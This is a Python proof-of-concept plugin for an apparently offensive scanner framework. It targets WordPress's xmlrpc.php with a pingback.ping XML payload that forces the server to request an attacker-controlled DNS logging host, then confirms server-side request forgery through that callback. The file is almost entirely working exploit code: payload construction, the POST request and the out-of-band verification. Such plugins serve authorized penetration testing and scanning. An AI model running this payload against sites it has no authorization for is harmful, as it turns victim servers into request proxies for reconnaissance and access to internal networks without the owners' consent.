#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'
import asyncio

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script


class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'wordpress xmlrpc ssrf'
        self.keyword = ['wordpress']
        self.info = 'wordpress xmlrpc ssrf'
        self.type = VUL_TYPE.SSRF
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            async with ClientSession() as session:
                for path in self.url_normpath(self.url, ['./', './wordpress/']):
                    dns = self.ceye_dns_api(k='xmlrpc',t='dns')
                    url = path + 'xmlrpc.php'
                    headers = {"Content-Type": "text/xml"}
                    data = '''<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://{dns}/</string></value></param>
<param><value><string>{path}?p=1</string></value></param>
</params>
</methodCall>'''.format(dns=dns, path=path)
                    async with session.post(url=url, data=data, headers=headers) as res:
                        if res != None:
                            await asyncio.sleep(1)
                            if await self.ceye_verify_api(dns, 'dns'):
                                self.flag = 1
                                self.req.append({"url": url})
                                self.res.append({"info": url, "key": "wordpress xmlrpc ssrf"})
                                break
